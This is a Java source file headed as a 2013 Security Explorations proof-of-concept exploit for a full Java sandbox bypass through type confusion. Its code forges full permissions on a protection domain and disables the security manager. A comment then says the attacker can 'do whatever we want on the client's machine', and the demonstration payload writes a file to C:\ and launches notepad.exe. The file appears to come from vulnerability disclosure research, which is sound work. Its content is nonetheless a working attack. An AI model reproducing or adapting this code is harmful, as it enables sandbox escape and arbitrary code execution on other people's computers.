/*## (c) SECURITY EXPLORATIONS    2013 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* exploit for full JVM sandbox bypass                                        */
/* vulnerability condition: 1) arbitrary type confusion condition             */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.lang.*;
import java.lang.reflect.*;
import java.net.*;
import java.io.*;
import java.util.*;
import java.security.*;

public class Exploit {

  public static void Beyond() {
   try {
    String sysname=System.getProperty("os.name").toLowerCase();

    if (sysname.startsWith("windows")) {

     String txt="The system was compromised";

     try {
      FileOutputStream file=new FileOutputStream("c:\\se.txt");
      file.write(txt.getBytes());
      file.close();
     } catch (Throwable e) {}

     String cmd[]=new String[1];
     cmd[0]="notepad.exe";      
     Process p=Runtime.getRuntime().exec(cmd);
    }
   } catch (Throwable e) {e.printStackTrace();}
  }

  public static void set_privileges(MyAccessControlContext macc) {
   try {
     MyProtectionDomain mpd=macc.context[0];

     MyPermissions permissions=mpd.permissions;

     permissions.allPermission=(PermissionCollection)permissions;
   } catch(Throwable e) {e.printStackTrace();}
  }


  public static void run() {
   try {
     /* set "security" field of java.lang.System class to null              */
     System.setSecurityManager(null);
     System.out.println("Security manager = "+System.getSecurityManager());

     /* from now on we can do whatever we want on the client's machine      */
     Beyond();
   } catch(Throwable e) {e.printStackTrace();}
  }

}
